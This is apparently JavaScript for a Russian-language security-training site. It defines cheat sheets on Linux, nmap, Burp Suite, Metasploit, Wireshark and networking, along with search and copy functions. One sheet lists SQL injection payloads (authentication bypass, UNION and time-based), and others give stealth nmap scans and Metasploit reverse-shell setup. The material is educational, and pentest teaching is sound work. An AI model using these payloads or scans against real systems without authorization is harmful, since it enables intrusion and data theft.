// Система шпаргалок

const cheatsheets = [
    {
        id: 'linux-basics',
        title: 'Linux - Основные команды',
        category: 'linux',
        content: `
# Навигация
cd /path/to/directory    # Перейти в директорию
pwd                      # Текущая директория
ls -la                   # Список файлов (все)
ls -lh                   # Список с размерами

# Работа с файлами
cat file.txt             # Показать содержимое
head -n 20 file.txt      # Первые 20 строк
tail -f file.txt         # Следить за файлом
grep "pattern" file.txt  # Поиск в файле
find /path -name "*.txt" # Найти файлы

# Права доступа
chmod 755 file           # Изменить права
chown user:group file    # Изменить владельца
chmod +x script.sh       # Сделать исполняемым

# Процессы
ps aux                   # Все процессы
top                      # Мониторинг процессов
kill -9 PID              # Убить процесс
jobs                     # Фоновые задачи

# Сеть
netstat -tulpn           # Сетевые соединения
ss -tulpn                # Современная замена netstat
curl -I url              # HTTP заголовки
wget url                 # Скачать файл
        `
    },
    {
        id: 'nmap',
        title: 'Nmap - Сканирование портов',
        category: 'pentest',
        content: `
# Базовое сканирование
nmap target.com                    # Быстрое сканирование
nmap -p 80,443 target.com          # Конкретные порты
nmap -p- target.com                # Все порты (1-65535)

# Типы сканирования
nmap -sS target.com                # SYN scan (stealth)
nmap -sT target.com                # TCP connect scan
nmap -sU target.com                # UDP scan
nmap -sN target.com                # NULL scan

# Определение ОС и версий
nmap -O target.com                 # Определение ОС
nmap -sV target.com                # Версии служб
nmap -A target.com                 # Агрессивное (ОС + версии + скрипты)

# Скрипты
nmap --script vuln target.com      # Поиск уязвимостей
nmap --script http-enum target.com # Перечисление HTTP
nmap -sC target.com                # Базовые скрипты

# Сканирование сети
nmap 192.168.1.0/24                # Сканирование подсети
nmap -iL targets.txt               # Список целей из файла
        `
    },
    {
        id: 'burp-suite',
        title: 'Burp Suite - Основы',
        category: 'pentest',
        content: `
# Основные функции
Proxy -> Intercept        # Перехват запросов
Target -> Site map        # Карта сайта
Scanner                   # Автоматическое сканирование
Repeater                  # Повтор запросов
Intruder                  # Fuzzing и брутфорс
Decoder                   # Кодирование/декодирование

# Настройка прокси
Proxy -> Options -> Proxy Listeners
Порт: 8080 (по умолчанию)
Настройка браузера: 127.0.0.1:8080

# Перехват запросов
Intercept is on           # Включить перехват
Forward                   # Отправить запрос
Drop                     # Отбросить запрос
        `
    },
    {
        id: 'python-security',
        title: 'Python - Безопасность',
        category: 'python',
        content: `
# Работа с сокетами
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('host', port))
s.send(b'data')
data = s.recv(1024)

# HTTP запросы
import requests
r = requests.get('http://example.com')
r = requests.post('http://example.com', data={'key': 'value'})

# Работа с файлами
with open('file.txt', 'r') as f:
    content = f.read()

# Регулярные выражения
import re
pattern = r'\\d+\\.\\d+\\.\\d+\\.\\d+'
matches = re.findall(pattern, text)

# Парсинг JSON
import json
data = json.loads(json_string)
json_string = json.dumps(data)
        `
    },
    {
        id: 'networking',
        title: 'Сети - Основы',
        category: 'networking',
        content: `
# Подсети
192.168.1.0/24          # 256 адресов (192.168.1.0-255)
192.168.1.0/25          # 128 адресов
192.168.1.0/26          # 64 адреса

# Маски подсетей
/24 = 255.255.255.0     # 256 хостов
/25 = 255.255.255.128   # 128 хостов
/26 = 255.255.255.192   # 64 хоста
/27 = 255.255.255.224   # 32 хоста

# Порты
20,21    FTP
22       SSH
23       Telnet
25       SMTP
53       DNS
80       HTTP
443      HTTPS
3306     MySQL
5432     PostgreSQL

# DNS
nslookup domain.com     # Запрос DNS
dig domain.com          # Детальный DNS запрос
host domain.com         # Простой DNS запрос
        `
    },
    {
        id: 'metasploit',
        title: 'Metasploit - Основы',
        category: 'tools',
        content: `
# Запуск
msfconsole              # Запустить Metasploit

# Поиск эксплойтов
search exploit_name     # Поиск эксплойта
use exploit/path       # Использовать эксплойт

# Настройка
set RHOST target_ip     # Целевой хост
set RPORT 80            # Порт
set PAYLOAD payload     # Payload
set LHOST your_ip       # Ваш IP (для reverse shell)

# Запуск
exploit                 # Запустить эксплойт
run                     # Альтернатива exploit

# Работа с сессиями
sessions                # Список сессий
sessions -i 1           # Войти в сессию 1
background              # Отправить в фон
        `
    },
    {
        id: 'wireshark',
        title: 'Wireshark - Фильтры',
        category: 'tools',
        content: `
# Базовые фильтры
ip.addr == 192.168.1.1  # IP адрес
tcp.port == 80          # TCP порт
udp.port == 53          # UDP порт
http                    # HTTP трафик
dns                     # DNS запросы

# Комбинированные
ip.src == 192.168.1.1 and tcp.port == 80
http.request.method == "GET"
tcp.flags.syn == 1      # SYN пакеты

# Поиск
frame contains "password"  # Поиск в пакетах
http.request.uri contains "login"
        `
    },
    {
        id: 'sql-injection',
        title: 'SQL Injection - Payloads',
        category: 'pentest',
        content: `
# Базовые payloads
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
admin'/*
' UNION SELECT NULL--
' UNION SELECT 1,2,3--

# Обход фильтров
' OR 1=1#
' OR 1=1-- -
admin' OR '1'='1
' UNION SELECT * FROM users--

# Время-базированные
'; WAITFOR DELAY '00:00:05'--
'; SELECT SLEEP(5)--
        `
    }
];

let filteredCheatsheets = cheatsheets;

// Рендеринг шпаргалок
function renderCheatsheets() {
    const container = document.getElementById('cheatsheetsContainer');
    
    if (filteredCheatsheets.length === 0) {
        container.innerHTML = '<p>Шпаргалки не найдены.</p>';
        return;
    }

    container.innerHTML = filteredCheatsheets.map(sheet => `
        <div class="cheatsheet-card" onclick="toggleCheatsheet('${sheet.id}')">
            <div class="cheatsheet-header">
                <h3>${sheet.title}</h3>
                <span class="category-badge category-${sheet.category}">${getCategoryName(sheet.category)}</span>
            </div>
            <div class="cheatsheet-content" id="content-${sheet.id}" style="display: none;">
                <pre><code>${escapeHtml(sheet.content.trim())}</code></pre>
                <button class="btn btn-secondary" onclick="event.stopPropagation(); copyCheatsheet('${sheet.id}')">
                    <i class="fas fa-copy"></i> Копировать
                </button>
            </div>
        </div>
    `).join('');
}

function getCategoryName(category) {
    const names = {
        'linux': 'Linux',
        'networking': 'Сети',
        'pentest': 'Пентест',
        'python': 'Python',
        'tools': 'Инструменты'
    };
    return names[category] || category;
}

function toggleCheatsheet(id) {
    const content = document.getElementById(`content-${id}`);
    if (content) {
        const isHidden = content.style.display === 'none' || !content.style.display;
        content.style.display = isHidden ? 'block' : 'none';
        
        // Проверка достижения "первая шпаргалка"
        if (isHidden && typeof AchievementsSystem !== 'undefined') {
            const firstCheatsheetKey = 'first_cheatsheet_opened';
            if (!localStorage.getItem(firstCheatsheetKey)) {
                AchievementsSystem.checkAchievement('first_cheatsheet');
                localStorage.setItem(firstCheatsheetKey, 'true');
            }
        }
    }
}

function copyCheatsheet(id) {
    const sheet = cheatsheets.find(s => s.id === id);
    if (sheet) {
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(sheet.content.trim()).then(() => {
                alert('Шпаргалка скопирована в буфер обмена!');
            }).catch(err => {
                console.error('Ошибка копирования:', err);
                // Fallback для старых браузеров
                const textArea = document.createElement('textarea');
                textArea.value = sheet.content.trim();
                document.body.appendChild(textArea);
                textArea.select();
                try {
                    document.execCommand('copy');
                    alert('Шпаргалка скопирована в буфер обмена!');
                } catch (e) {
                    alert('Не удалось скопировать. Скопируйте вручную.');
                }
                document.body.removeChild(textArea);
            });
        } else {
            // Fallback для старых браузеров
            const textArea = document.createElement('textarea');
            textArea.value = sheet.content.trim();
            document.body.appendChild(textArea);
            textArea.select();
            try {
                document.execCommand('copy');
                alert('Шпаргалка скопирована в буфер обмена!');
            } catch (e) {
                alert('Не удалось скопировать. Скопируйте вручную.');
            }
            document.body.removeChild(textArea);
        }
    }
}

function searchCheatsheets() {
    const query = document.getElementById('cheatsheetSearch').value.toLowerCase();
    filterCheatsheets(query, document.getElementById('categoryFilter').value);
}

function filterByCategory() {
    const category = document.getElementById('categoryFilter').value;
    const query = document.getElementById('cheatsheetSearch').value.toLowerCase();
    filterCheatsheets(query, category);
}

function filterCheatsheets(query, category) {
    filteredCheatsheets = cheatsheets.filter(sheet => {
        const matchesQuery = !query || 
            sheet.title.toLowerCase().includes(query) ||
            sheet.content.toLowerCase().includes(query);
        const matchesCategory = category === 'all' || sheet.category === category;
        return matchesQuery && matchesCategory;
    });
    renderCheatsheets();
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Инициализация
document.addEventListener('DOMContentLoaded', () => {
    renderCheatsheets();
});

